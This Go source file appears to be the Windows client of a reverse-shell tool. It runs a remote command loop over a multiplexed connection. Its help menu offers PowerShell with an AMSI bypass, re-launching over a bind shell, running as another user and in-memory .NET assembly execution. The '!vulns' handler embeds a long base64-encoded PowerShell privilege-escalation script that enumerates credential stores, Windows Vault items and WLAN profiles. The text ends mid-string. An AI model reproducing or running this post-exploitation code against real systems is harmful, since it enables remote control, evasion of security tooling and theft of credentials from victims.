package client

import (
	"bufio"
	"encoding/base64"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net"
	"os"
	"time"

	"../plugins"
	"../shell"
	"../utils"
	"../vulns"
	"github.com/hashicorp/yamux"
	"github.com/ropnop/go-clr"
)

// Run runs the mainloop of the shell
func Run(s *yamux.Session, c net.Conn) {
	defer c.Close()

	// open 2nd channel
	signalSession, err := s.Accept()
	if err != nil {
		fmt.Println(err)
	}
	signalScanner := bufio.NewScanner(signalSession)

	scanner := bufio.NewScanner(c)
	homedir, err := os.UserHomeDir()
	if err != nil {
		homedir = "C:"
	}
	// init
	plugins.Init(c)
	prompt(c)

	go func() {
		for signalScanner.Scan() {
			command := signalScanner.Text()
			//fmt.Printf("Command %s\n", command)
			switch command {
			case "!sigint":
				if shellPipeReader != nil && shellPipeWriter != nil && shellCmd != nil {
					//log.Println("Quitting shell (Ctrl+C)")
					shellCmd.Process.Kill()
					shellPipeReader.Close()
					shellPipeWriter.Close()
					shellCmd = nil
				}
			default:
				// pass
			}
		}
	}()

	for scanner.Scan() {
		command := scanner.Text()
		if len(command) > 1 {
			argv := splitArgs(command)
			// we only handle commands here that do something on the client side
			// commands that are shared between different os
			help := usage()
			help += "\n"
			help += "  !powershell\n"
			help += "    * starts powershell with AMSI Bypass\n"
			help += "  !rc <port>\n"
			help += "    * connects to a local bind shell and restarts this client over it\n"
			help += "  !runasps <username> <password> <domain>\n"
			help += "    * restart xc with the specified user using powershell\n"
			help += "  !vulns\n"
			help += "    * checks for common vulnerabilities\n"
			help += "  !net <sample.exe> <arg1> <arg2> ...\n"
			help += "    * Uploads & Runs a .NET assembly from memory\n"

			handled := handleSharedCommand(s, c, argv, help, homedir)
			// os specific commands
			if !handled {
				switch argv[0] {
				case "!vulns":
					// we also run privesc check
					privescCheck := "I1JlcXVpcmVzIC1WZXJzaW9uIDIKCiMgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIEJFR0lOIEdsb2JhbCB2YXJpYWJsZXMKIyAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiRnbG9iYWw6U2NyaXB0UGF0aCA9ICRNeUludm9jYXRpb24uTXlDb21tYW5kLkRlZmluaXRpb24KJGdsb2JhbDpDYWNoZWRTZXJ2aWNlTGlzdCA9IE5ldy1PYmplY3QgLVR5cGVOYW1lIFN5c3RlbS5Db2xsZWN0aW9ucy5BcnJheUxpc3QKJGdsb2JhbDpDYWNoZWRIb3RGaXhMaXN0ID0gTmV3LU9iamVjdCAtVHlwZU5hbWUgU3lzdGVtLkNvbGxlY3Rpb25zLkFycmF5TGlzdAokZ2xvYmFsOkNhY2hlZFNjaGVkdWxlZFRhc2tMaXN0ID0gTmV3LU9iamVjdCAtVHlwZU5hbWUgU3lzdGVtLkNvbGxlY3Rpb25zLkFycmF5TGlzdAokZ2xvYmFsOlJlc3VsdEFycmF5TGlzdCA9IE5ldy1PYmplY3QgLVR5cGVOYW1lIFN5c3RlbS5Db2xsZWN0aW9ucy5BcnJheUxpc3QKW3N0cmluZ1tdXSAkZ2xvYmFsOktleXdvcmRzT2ZJbnRlcmVzdCA9ICJrZXkiLCAicGFzc3ciLCAic2VjcmV0IiwgInB3ZCIsICJjcmVkcyIsICJjcmVkZW50aWFsIiwgImFwaSIKIyAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgRU5EIEdsb2JhbCB2YXJpYWJsZXMKIyAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCgojIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBXaW4zMiBzdHVmZiAgCiMgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojcmVnaW9uIFdpbjMyCiRDU2hhcnBTb3VyY2UgPSBAJwpwcml2YXRlIGNvbnN0IEludDMyIEFOWVNJWkVfQVJSQVkgPSAxOwoKW1N5c3RlbS5GbGFnc0F0dHJpYnV0ZV0KcHVibGljIGVudW0gU2VydmljZUFjY2Vzc0ZsYWdzIDogdWludAp7CiAgICBRdWVyeUNvbmZpZyA9IDEsCiAgICBDaGFuZ2VDb25maWcgPSAyLAogICAgUXVlcnlTdGF0dXMgPSA0LAogICAgRW51bWVyYXRlRGVwZW5kZW50cyA9IDgsCiAgICBTdGFydCA9IDE2LAogICAgU3RvcCA9IDMyLAogICAgUGF1c2VDb250aW51ZSA9IDY0LAogICAgSW50ZXJyb2dhdGUgPSAxMjgsCiAgICBVc2VyRGVmaW5lZENvbnRyb2wgPSAyNTYsCiAgICBEZWxldGUgPSA2NTUzNiwKICAgIFJlYWRDb250cm9sID0gMTMxMDcyLAogICAgV3JpdGVEYWMgPSAyNjIxNDQsCiAgICBXcml0ZU93bmVyID0gNTI0Mjg4LAogICAgU3luY2hyb25pemUgPSAxMDQ4NTc2LAogICAgQWNjZXNzU3lzdGVtU2VjdXJpdHkgPSAxNjc3NzIxNiwKICAgIEdlbmVyaWNBbGwgPSAyNjg0MzU0NTYsCiAgICBHZW5lcmljRXhlY3V0ZSA9IDUzNjg3MDkxMiwKICAgIEdlbmVyaWNXcml0ZSA9IDEwNzM3NDE4MjQsCiAgICBHZW5lcmljUmVhZCA9IDIxNDc0ODM2NDgKfQoKW1N0cnVjdExheW91dChMYXlvdXRLaW5kLlNlcXVlbnRpYWwpXQpwdWJsaWMgc3RydWN0IExVSUQgewogICBwdWJsaWMgVUludDMyIExvd1BhcnQ7CiAgIHB1YmxpYyBJbnQzMiBIaWdoUGFydDsKfQoKW1N0cnVjdExheW91dChMYXlvdXRLaW5kLlNlcXVlbnRpYWwpXQpwdWJsaWMgc3RydWN0IFNJRF9BTkRfQVRUUklCVVRFUyB7CiAgICBwdWJsaWMgSW50UHRyIFNpZDsKICAgIHB1YmxpYyBpbnQgQXR0cmlidXRlczsKfQoKW1N0cnVjdExheW91dChMYXlvdXRLaW5kLlNlcXVlbnRpYWwsIFBhY2sgPSA0KV0KcHVibGljIHN0cnVjdCBMVUlEX0FORF9BVFRSSUJVVEVTIHsKICAgcHVibGljIExVSUQgTHVpZDsKICAgcHVibGljIFVJbnQzMiBBdHRyaWJ1dGVzOwp9CgpwdWJsaWMgc3RydWN0IFRPS0VOX1VTRVIgewogICAgcHVibGljIFNJRF9BTkRfQVRUUklCVVRFUyBVc2VyOwp9CgpwdWJsaWMgc3RydWN0IFRPS0VOX1BSSVZJTEVHRVMgewogICAgcHVibGljIGludCBQcml2aWxlZ2VDb3VudDsKICAgIFtNYXJzaGFsQXMoVW5tYW5hZ2VkVHlwZS5CeVZhbEFycmF5LCBTaXplQ29uc3Q9QU5ZU0laRV9BUlJBWSldCiAgICBwdWJsaWMgTFVJRF9BTkRfQVRUUklCVVRFUyBbXSBQcml2aWxlZ2VzOwp9CgpbU3RydWN0TGF5b3V0KExheW91dEtpbmQuU2VxdWVudGlhbCldCnB1YmxpYyBzdHJ1Y3QgTUlCX1RDUFJPV19PV05FUl9QSUQKewogICAgcHVibGljIHVpbnQgc3RhdGU7CiAgICBwdWJsaWMgdWludCBsb2NhbEFkZHI7CiAgICBbTWFyc2hhbEFzKFVubWFuYWdlZFR5cGUuQnlWYWxBcnJheSwgU2l6ZUNvbnN0ID0gNCldCiAgICBwdWJsaWMgYnl0ZVtdIGxvY2FsUG9ydDsKICAgIHB1YmxpYyB1aW50IHJlbW90ZUFkZHI7CiAgICBbTWFyc2hhbEFzKFVubWFuYWdlZFR5cGUuQnlWYWxBcnJheSwgU2l6ZUNvbnN0ID0gNCldCiAgICBwdWJsaWMgYnl0ZVtdIHJlbW90ZVBvcnQ7CiAgICBwdWJsaWMgdWludCBvd25pbmdQaWQ7Cn0KCltTdHJ1Y3RMYXlvdXQoTGF5b3V0S2luZC5TZXF1ZW50aWFsKV0KcHVibGljIHN0cnVjdCBNSUJfVURQUk9XX09XTkVSX1BJRAp7CiAgICBwdWJsaWMgdWludCBsb2NhbEFkZHI7CiAgICBbTWFyc2hhbEFzKFVubWFuYWdlZFR5cGUuQnlWYWxBcnJheSwgU2l6ZUNvbnN0ID0gNCldCiAgICBwdWJsaWMgYnl0ZVtdIGxvY2FsUG9ydDsKICAgIHB1YmxpYyB1aW50IG93bmluZ1BpZDsKfQoKW1N0cnVjdExheW91dChMYXlvdXRLaW5kLlNlcXVlbnRpYWwpXQpwdWJsaWMgc3RydWN0IE1JQl9UQ1A2Uk9XX09XTkVSX1BJRAp7CiAgICBbTWFyc2hhbEFzKFVubWFuYWdlZFR5cGUuQnlWYWxBcnJheSwgU2l6ZUNvbnN0ID0gMTYpXQogICAgcHVibGljIGJ5dGVbXSBsb2NhbEFkZHI7CiAgICBwdWJsaWMgdWludCBsb2NhbFNjb3BlSWQ7CiAgICBbTWFyc2hhbEFzKFVubWFuYWdlZFR5cGUuQnlWYWxBcnJheSwgU2l6ZUNvbnN0ID0gNCldCiAgICBwdWJsaWMgYnl0ZVtdIGxvY2FsUG9ydDsKICAgIFtNYXJzaGFsQXMoVW5tYW5hZ2VkVHlwZS5CeVZhbEFycmF5LCBTaXplQ29uc3QgPSAxNildCiAgICBwdWJsaWMgYnl0ZVtdIHJlbW90ZUFkZHI7CiAgICBwdWJsaWMgdWludCByZW1vdGVTY29wZUlkOwogICAgW01hcnNoYWxBcyhVbm1hbmFnZWRUeXBlLkJ5VmFsQXJyYXksIFNpemVDb25zdCA9IDQpXQogICAgcHVibGljIGJ5dGVbXSByZW1vdGVQb3J0OwogICAgcHVibGljIHVpbnQgc3RhdGU7CiAgICBwdWJsaWMgdWludCBvd25pbmdQaWQ7Cn0KCltTdHJ1Y3RMYXlvdXQoTGF5b3V0S2luZC5TZXF1ZW50aWFsKV0KcHVibGljIHN0cnVjdCBNSUJfVURQNlJPV19PV05FUl9QSUQKewogICAgW01hcnNoYWxBcyhVbm1hbmFnZWRUeXBlLkJ5VmFsQXJyYXksIFNpemVDb25zdCA9IDE2KV0KICAgIHB1YmxpYyBieXRlW10gbG9jYWxBZGRyOwogICAgcHVibGljIHVpbnQgbG9jYWxTY29wZUlkOwogICAgW01hcnNoYWxBcyhVbm1hbmFnZWRUeXBlLkJ5VmFsQXJyYXksIFNpemVDb25zdCA9IDQpXQogICAgcHVibGljIGJ5dGVbXSBsb2NhbFBvcnQ7CiAgICBwdWJsaWMgdWludCBvd25pbmdQaWQ7Cn0KCltTdHJ1Y3RMYXlvdXQoTGF5b3V0S2luZC5TZXF1ZW50aWFsKV0KcHVibGljIHN0cnVjdCBNSUJfVENQVEFCTEVfT1dORVJfUElECnsKICAgIHB1YmxpYyB1aW50IGR3TnVtRW50cmllczsKICAgIFtNYXJzaGFsQXMoVW5tYW5hZ2VkVHlwZS5CeVZhbEFycmF5LCBBcnJheVN1YlR5cGUgPSBVbm1hbmFnZWRUeXBlLlN0cnVjdCwgU2l6ZUNvbnN0ID0gMSldCiAgICBwdWJsaWMgTUlCX1RDUFJPV19PV05FUl9QSURbXSB0YWJsZTsKfQoKW1N0cnVjdExheW91dChMYXlvdXRLaW5kLlNlcXVlbnRpYWwpXQpwdWJsaWMgc3RydWN0IE1JQl9VRFBUQUJMRV9PV05FUl9QSUQKewogICAgcHVibGljIHVpbnQgZHdOdW1FbnRyaWVzOwogICAgW01hcnNoYWxBcyhVbm1hbmFnZWRUeXBlLkJ5VmFsQXJyYXksIEFycmF5U3ViVHlwZSA9IFVubWFuYWdlZFR5cGUuU3RydWN0LCBTaXplQ29uc3QgPSAxKV0KICAgIHB1YmxpYyBNSUJfVURQUk9XX09XTkVSX1BJRFtdIHRhYmxlOwp9CgpbU3RydWN0TGF5b3V0KExheW91dEtpbmQuU2VxdWVudGlhbCldCnB1YmxpYyBzdHJ1Y3QgTUlCX1RDUDZUQUJMRV9PV05FUl9QSUQKewogICAgcHVibGljIHVpbnQgZHdOdW1FbnRyaWVzOwogICAgW01hcnNoYWxBcyhVbm1hbmFnZWRUeXBlLkJ5VmFsQXJyYXksIEFycmF5U3ViVHlwZSA9IFVubWFuYWdlZFR5cGUuU3RydWN0LCBTaXplQ29uc3QgPSAxKV0KICAgIHB1YmxpYyBNSUJfVENQNlJPV19PV05FUl9QSURbXSB0YWJsZTsKfQoKW1N0cnVjdExheW91dChMYXlvdXRLaW5kLlNlcXVlbnRpYWwpXQpwdWJsaWMgc3RydWN0IE1JQl9VRFA2VEFCTEVfT1dORVJfUElECnsKICAgIHB1YmxpYyB1aW50IGR3TnVtRW50cmllczsKICAgIFtNYXJzaGFsQXMoVW5tYW5hZ2VkVHlwZS5CeVZhbEFycmF5LCBBcnJheVN1YlR5cGUgPSBVbm1hbmFnZWRUeXBlLlN0cnVjdCwgU2l6ZUNvbnN0ID0gMSldCiAgICBwdWJsaWMgTUlCX1VEUDZST1dfT1dORVJfUElEW10gdGFibGU7Cgp9CgpbU3RydWN0TGF5b3V0KExheW91dEtpbmQuU2VxdWVudGlhbCldCnB1YmxpYyBzdHJ1Y3QgRklMRVRJTUUKewogICAgcHVibGljIHVpbnQgZHdMb3dEYXRlVGltZTsKICAgIHB1YmxpYyB1aW50IGR3SGlnaERhdGVUaW1lOwp9CgpbU3RydWN0TGF5b3V0KExheW91dEtpbmQuU2VxdWVudGlhbCwgQ2hhclNldD1DaGFyU2V0LlVuaWNvZGUpXQpwdWJsaWMgc3RydWN0IENSRURFTlRJQUwKewogICAgcHVibGljIHVpbnQgRmxhZ3M7CiAgICBwdWJsaWMgdWludCBUeXBlOwogICAgcHVibGljIHN0cmluZyBUYXJnZXROYW1lOwogICAgcHVibGljIHN0cmluZyBDb21tZW50OwogICAgcHVibGljIEZJTEVUSU1FIExhc3RXcml0dGVuOwogICAgcHVibGljIHVpbnQgQ3JlZGVudGlhbEJsb2JTaXplOwogICAgcHVibGljIEludFB0ciBDcmVkZW50aWFsQmxvYjsKICAgIHB1YmxpYyB1aW50IFBlcnNpc3Q7CiAgICBwdWJsaWMgdWludCBBdHRyaWJ1dGVDb3VudDsKICAgIHB1YmxpYyBJbnRQdHIgQXR0cmlidXRlczsKICAgIHB1YmxpYyBzdHJpbmcgVGFyZ2V0QWxpYXM7CiAgICBwdWJsaWMgc3RyaW5nIFVzZXJOYW1lOwp9CgpbU3RydWN0TGF5b3V0KExheW91dEtpbmQuU2VxdWVudGlhbCldCnB1YmxpYyBzdHJ1Y3QgVU5JQ09ERV9TVFJJTkcKewogICBwdWJsaWMgdXNob3J0IExlbmd0aDsKICAgcHVibGljIHVzaG9ydCBNYXhpbXVtTGVuZ3RoOwogICBwdWJsaWMgSW50UHRyIEJ1ZmZlcjsKfQoKW1N0cnVjdExheW91dChMYXlvdXRLaW5kLlNlcXVlbnRpYWwsIENoYXJTZXQ9Q2hhclNldC5Vbmljb2RlKV0KcHVibGljIHN0cnVjdCBWQVVMVF9JVEVNXzcKewogICAgcHVibGljIEd1aWQgU2NoZW1hSWQ7CiAgICBwdWJsaWMgc3RyaW5nIEZyaWVuZGx5TmFtZTsKICAgIHB1YmxpYyBJbnRQdHIgUmVzb3VyY2U7CiAgICBwdWJsaWMgSW50UHRyIElkZW50aXR5OwogICAgcHVibGljIEludFB0ciBBdXRoZW50aWNhdG9yOwogICAgcHVibGljIFVJbnQ2NCBMYXN0V3JpdHRlbjsKICAgIHB1YmxpYyBVSW50MzIgRmxhZ3M7CiAgICBwdWJsaWMgVUludDMyIFByb3BlcnRpZXNDb3VudDsKICAgIHB1YmxpYyBJbnRQdHIgUHJvcGVydGllczsKfQoKW1N0cnVjdExheW91dChMYXlvdXRLaW5kLlNlcXVlbnRpYWwsIENoYXJTZXQ9Q2hhclNldC5Vbmljb2RlKV0KcHVibGljIHN0cnVjdCBWQVVMVF9JVEVNXzgKewogICAgcHVibGljIEd1aWQgU2NoZW1hSWQ7CiAgICBwdWJsaWMgc3RyaW5nIEZyaWVuZGx5TmFtZTsKICAgIHB1YmxpYyBJbnRQdHIgUmVzb3VyY2U7CiAgICBwdWJsaWMgSW50UHRyIElkZW50aXR5OwogICAgcHVibGljIEludFB0ciBBdXRoZW50aWNhdG9yOwogICAgcHVibGljIEludFB0ciBQYWNrYWdlU2lkOwogICAgcHVibGljIFVJbnQ2NCBMYXN0V3JpdHRlbjsKICAgIHB1YmxpYyBVSW50MzIgRmxhZ3M7CiAgICBwdWJsaWMgVUludDMyIFByb3BlcnRpZXNDb3VudDsKICAgIHB1YmxpYyBJbnRQdHIgUHJvcGVydGllczsKfQoKW1N0cnVjdExheW91dChMYXlvdXRLaW5kLlNlcXVlbnRpYWwpXQpwdWJsaWMgc3RydWN0IFZBVUxUX0lURU1fREFUQV9IRUFERVIKewogICAgcHVibGljIFVJbnQzMiBTY2hlbWFFbGVtZW50SWQ7CiAgICBwdWJsaWMgVUludDMyIFVua25vd24xOwogICAgcHVibGljIFVJbnQzMiBUeXBlOwogICAgcHVibGljIFVJbnQzMiBVbmtub3duMjsKfQoKW1N0cnVjdExheW91dChMYXlvdXRLaW5kLlNlcXVlbnRpYWwsIENoYXJTZXQgPSBDaGFyU2V0LlVuaWNvZGUpXQpwdWJsaWMgc3RydWN0IFdMQU5fSU5URVJGQUNFX0lORk8KewogICAgcHVibGljIEd1aWQgSW50ZXJmYWNlR3VpZDsKICAgIFtNYXJzaGFsQXMoVW5tYW5hZ2VkVHlwZS5CeVZhbFRTdHIsIFNpemVDb25zdCA9IDI1NildCiAgICBwdWJsaWMgc3RyaW5nIHN0ckludGVyZmFjZURlc2NyaXB0aW9uOwogICAgcHVibGljIHVpbnQgaXNTdGF0ZTsgLy8gV0xBTl9JTlRFUkZBQ0VfU1RBVEUKfQoKW1N0cnVjdExheW91dChMYXlvdXRLaW5kLlNlcXVlbnRpYWwsIENoYXJTZXQgPSBDaGFyU2V0LlVuaWNvZGUpXQpwdWJsaWMgc3RydWN0IFdMQU5fUFJPRklMRV9JTkZPCnsKICAgIFtNYXJzaGFsQXMoVW5tYW5hZ2VkVHlwZS5CeVZhbFRTdHIsIFNpemVDb25zdCA9IDI1NildCiAgICBwdWJsaWMgc3RyaW5nIHN0clByb2ZpbGVOYW1lOwogICAgcHVibGljIHVpbnQgZHdGbGFnczsKfQoKW0RsbEltcG9ydCgiYWR2YXBpMzIuZGxsIiwgU2V0TGFzdEVycm9yPXRydWUpXQpbcmV0dXJuOiBNYXJzaGFsQXMoVW5tYW5hZ2VkVHlwZS5Cb29sKV0KcHVibGljIHN0YXRpYyBleHRlcm4gYm9vbCBRdWVyeVNlcnZpY2VPYmplY3RTZWN1cml0eShJbnRQdHIgc2VydmljZUhhbmRsZSwgU3lzdGVtLlNlY3VyaXR5LkFjY2Vzc0NvbnRyb2wuU2VjdXJpdHlJbmZvcyBzZWNJbmZvLCBieXRlW10gbHBTZWNEZXNyQnVmLCB1aW50IGJ1ZlNpemUsIG91dCB1aW50IGJ1ZlNpemVOZWVkZWQpOwoKW0RsbEltcG9ydCgiYWR2YXBpMzIuZGxsIiwgU2V0TGFzdEVycm9yPXRydWUpXQpbcmV0dXJuOiBNYXJzaGFsQXMoVW5tYW5hZ2VkVHlwZS5Cb29sKV0KcHVibGljIHN0YXRpYyBleHRlcm4gYm9vbCBDbG9zZVNlcnZpY2VIYW5kbGUoSW50UHRyIGhTQ09iamVjdCk7CgpbRGxsSW1wb3J0KCJhZHZhcGkzMi5kbGwiLCBTZXRMYXN0RXJyb3I9dHJ1ZSldCltyZXR1cm46IE1hcnNoYWxBcyhVbm1hbmFnZWRUeXBlLkJvb2wpXQpwdWJsaWMgc3RhdGljIGV4dGVybiBib29sIE9wZW5Qcm9jZXNzVG9rZW4oSW50UHRyIFByb2Nlc3NIYW5kbGUsIFVJbnQzMiBEZXNpcmVkQWNjZXNzLCBvdXQgSW50UHRyIFRva2VuSGFuZGxlKTsKCltEbGxJbXBvcnQoImFkdmFwaTMyLmRsbCIsIFNldExhc3RFcnJvcj10cnVlKV0KW3JldHVybjogTWFyc2hhbEFzKFVubWFuYWdlZFR5cGUuQm9vbCldCnB1YmxpYyBzdGF0aWMgZXh0ZXJuIGJvb2wgR2V0VG9rZW5JbmZvcm1hdGlvbihJbnRQdHIgVG9rZW5IYW5kbGUsIFVJbnQzMiBUb2tlbkluZm9ybWF0aW9uQ2xhc3MsIEludFB0ciBUb2tlbkluZm9ybWF0aW9uLCBVSW50MzIgVG9rZW5JbmZvcm1hdGlvbkxlbmd0aCwgb3V0IFVJbnQzMiBSZXR1cm5MZW5ndGgpOwoKW0RsbEltcG9ydCgiYWR2YXBpMzIuZGxsIiwgQ2hhclNldD1DaGFyU2V0LkF1dG8sIFNldExhc3RFcnJvcj10cnVlKV0KW3JldHVybjogTWFyc2hhbEFzKFVubWFuYWdlZFR5cGUuQm9vbCldCnB1YmxpYyBzdGF0aWMgZXh0ZXJuIGJvb2wgTG9va3VwQWNjb3VudFNpZChzdHJpbmcgbHBTeXN0ZW1OYW1lLCBJbnRQdHIgU2lkLCBTeXN0ZW0uVGV4dC5TdHJpbmdCdWlsZGVyIGxwTmFtZSwgcmVmIHVpbnQgY2NoTmFtZSwgU3lzdGVtLlRleHQuU3RyaW5nQnVpbGRlciBSZWZlcmVuY2VkRG9tYWluTmFtZSwgcmVmIHVpbnQgY2NoUmVmZXJlbmNlZERvbWFpbk5hbWUsIG91dCBpbnQgcGVVc2UpOwoKW0RsbEltcG9ydCgiYWR2YXBpMzIuZGxsIiwgQ2hhclNldD1DaGFyU2V0LkF1dG8sIFNldExhc3RFcnJvcj10cnVlKV0KW3JldHVybjogTWFyc2hhbEFzKFVubWFuYWdlZFR5cGUuQm9vbCldCnB1YmxpYyBzdGF0aWMgZXh0ZXJuIGJvb2wgTG9va3VwUHJpdmlsZWdlTmFtZShzdHJpbmcgbHBTeXN0ZW1OYW1lLCBJbnRQdHIgbHBMdWlkLCBTeXN0ZW0uVGV4dC5TdHJpbmdCdWlsZGVyIGxwTmFtZSwgcmVmIGludCBjY2hOYW1lICk7CgpbRGxsSW1wb3J0KCJhZHZhcGkzMi5kbGwiLCBDaGFyU2V0PUNoYXJTZXQuVW5pY29kZSwgU2V0TGFzdEVycm9yPXRydWUpXQpbcmV0dXJuOiBNYXJzaGFsQXMoVW5tYW5hZ2VkVHlwZS5Cb29sKV0KcHVibGljIHN0YXRpYyBleHRlcm4gYm9vbCBDcmVkRW51bWVyYXRlKEludFB0ciBGaWx0ZXIsIFVJbnQzMiBGbGFncywgb3V0IFVJbnQzMiBDb3VudCwgb3V0IEludFB0ciBDcmVkZW50aWFscyk7CgpbRGxsSW1wb3J0KCJhZHZhcGkzMi5kbGwiKV0KcHVibGljIHN0YXRpYyBleHRlcm4gdm9pZCBDcmVkRnJlZShJbnRQdHIgQnVmZmVyKTsKCltEbGxJbXBvcnQoImFkdmFwaTMyLmRsbCIsIFNldExhc3RFcnJvcj1mYWxzZSldCltyZXR1cm46IE1hcnNoYWxBcyhVbm1hbmFnZWRUeXBlLkJvb2wpXQpwdWJsaWMgc3RhdGljIGV4dGVybiBib29sIElzVGV4dFVuaWNvZGUoSW50UHRyIGJ1ZiwgVUludDMyIGxlbiwgcmVmIFVJbnQzMiBvcHQpOwoKW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIiwgU2V0TGFzdEVycm9yPXRydWUpXQpwdWJsaWMgc3RhdGljIGV4dGVybiBJbnRQdHIgR2V0Q3VycmVudFByb2Nlc3MoKTsKCltEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIsIFNldExhc3RFcnJvcj10cnVlKV0KcHVibGljIHN0YXRpYyBleHRlcm4gSW50UHRyIE9wZW5Qcm9jZXNzKHVpbnQgcHJvY2Vzc0FjY2VzcywgYm9vbCBiSW5oZXJpdEhhbmRsZSwgaW50IHByb2Nlc3NJZCk7CgpbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiLCBTZXRMYXN0RXJyb3I9dHJ1ZSldCltyZXR1cm46IE1hcnNoYWxBcyhVbm1hbmFnZWRUeXBlLkJvb2wpXQpwdWJsaWMgc3RhdGljIGV4dGVybiBib29sIENsb3NlSGFuZGxlKEludFB0ciBoT2JqZWN0KTsKCltEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIpXQpwdWJsaWMgc3RhdGljIGV4dGVybiBVSW50NjQgR2V0VGlja0NvdW50NjQoKTsKCltEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIsIENoYXJTZXQ9Q2hhclNldC5BdXRvLCBTZXRMYXN0RXJyb3I9dHJ1ZSldCnB1YmxpYyBzdGF0aWMgZXh0ZXJuIHVpbnQgR2V0RmlybXdhcmVFbnZpcm9ubWVudFZhcmlhYmxlKHN0cmluZyBscE5hbWUsIHN0cmluZyBscEd1aWQsIEludFB0ciBwQnVmZmVyLCB1aW50IG5TaXplKTsKCltEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIsIFNldExhc3RFcnJvcj10cnVlKV0KcHVibGljIHN0YXRpYyBleHRlcm4gYm9vbCBHZXRGaXJtd2FyZVR5cGUocmVmIHVpbnQgRmlybXdhcmVUeXBlKTsKCltEbGxJbXBvcnQoImlwaGxwYXBpLmRsbCIsIFNldExhc3RFcnJvcj10cnVlKV0KcHVibGljIHN0YXRpYyBleHRlcm4gdWludCBHZXRFeHRlbmRlZFRjcFRhYmxlKEludFB0ciBwVGNwVGFibGUsIHJlZiBpbnQgcGR3U2l6ZSwgYm9vbCBiT3JkZXIsIGludCB1bEFmLCB1aW50IFRhYmxlQ2xhc3MsIHVpbnQgUmVzZXJ2ZWQpOwoKW0RsbEltcG9ydCgiaXBobHBhcGkuZGxsIiwgU2V0TGFzdEVycm9yPXRydWUpXQpwdWJsaWMgc3RhdGljIGV4dGVybiB1aW50IEdldEV4dGVuZGVkVWRwVGFibGUoSW50UHRyIHBVZHBUYWJsZSwgcmVmIGludCBwZHdTaXplLCBib29sIGJPcmRlciwgaW50IHVsQWYsIHVpbnQgVGFibGVDbGFzcywgdWludCBSZXNlcnZlZCk7CgpbRGxsSW1wb3J0KCJ2YXVsdGNsaS5kbGwiLCBTZXRMYXN0RXJyb3I9ZmFsc2UpXQpwdWJsaWMgc3RhdGljIGV4dGVybiB1aW50IFZhdWx0RW51bWVyYXRlVmF1bHRzKHVpbnQgZHdGbGFncywgb3V0IGludCBWYXVsdHNDb3VudCwgb3V0IEludFB0ciBwcFZhdWx0R3VpZHMpOwoKW0RsbEltcG9ydCgidmF1bHRjbGkuZGxsIiwgU2V0TGFzdEVycm9yPWZhbHNlKV0KcHVibGljIHN0YXRpYyBleHRlcm4gdWludCBWYXVsdE9wZW5WYXVsdChJbnRQdHIgcFZhdWx0SWQsIHVpbnQgZHdGbGFncywgb3V0IEludFB0ciBwVmF1bHRIYW5kbGUpOwoKW0RsbEltcG9ydCgidmF1bHRjbGkuZGxsIiwgU2V0TGFzdEVycm9yPWZhbHNlKV0KcHVibGljIHN0YXRpYyBleHRlcm4gdWludCBWYXVsdEVudW1lcmF0ZUl0ZW1zKEludFB0ciBwVmF1bHRIYW5kbGUsIHVpbnQgZHdGbGFncywgb3V0IGludCBJdGVtc0NvdW50LCBvdXQgSW50UHRyIHBwSXRlbXMpOwoKW0RsbEltcG9ydCgidmF1bHRjbGkuZGxsIiwgU2V0TGFzdEVycm9yPWZhbHNlLCBFbnRyeVBvaW50PSJWYXVsdEdldEl0ZW0iKV0KcHVibGljIHN0YXRpYyBleHRlcm4gdWludCBWYXVsdEdldEl0ZW03KEludFB0ciBwVmF1bHRIYW5kbGUsIHJlZiBHdWlkIGd1aWRTY2hlbWFJZCwgSW50UHRyIHBSZXNvdXJjZSwgSW50UHRyIHBJZGVudGl0eSwgSW50UHRyIHBVbmtub3duLCB1aW50IGlVbmtub3duLCBvdXQgSW50UHRyIHBJdGVtKTsKCltEbGxJbXBvcnQoInZhdWx0Y2xpLmRsbCIsIFNldExhc3RFcnJvcj1mYWxzZSwgRW50cnlQb2ludD0iVmF1bHRHZXRJdGVtIildCnB1YmxpYyBzdGF0aWMgZXh0ZXJuIHVpbnQgVmF1bHRHZXRJdGVtOChJbnRQdHIgcFZhdWx0SGFuZGxlLCByZWYgR3VpZCBndWlkU2NoZW1hSWQsIEludFB0ciBwUmVzb3VyY2UsIEludFB0ciBwSWRlbnRpdHksIEludFB0ciBwUGFja2FnZVNpZCwgSW50UHRyIHBVbmtub3duLCB1aW50IGlVbmtub3duLCBvdXQgSW50UHRyIHBJdGVtKTsKCltEbGxJbXBvcnQoInZhdWx0Y2xpLmRsbCIsIFNldExhc3RFcnJvcj1mYWxzZSldCnB1YmxpYyBzdGF0aWMgZXh0ZXJuIHVpbnQgVmF1bHRGcmVlKEludFB0ciBwVmF1bHRJdGVtKTsKCltEbGxJbXBvcnQoInZhdWx0Y2xpLmRsbCIsIFNldExhc3RFcnJvcj1mYWxzZSldCnB1YmxpYyBzdGF0aWMgZXh0ZXJuIHVpbnQgVmF1bHRDbG9zZVZhdWx0KHJlZiBJbnRQdHIgcFZhdWx0SGFuZGxlKTsKCltEbGxJbXBvcnQoIldsYW5hcGkuZGxsIildCnB1YmxpYyBzdGF0aWMgZXh0ZXJuIHVpbnQgV2xhbk9wZW5IYW5kbGUodWludCBkd0NsaWVudFZlcnNpb24sIEludFB0ciBwUmV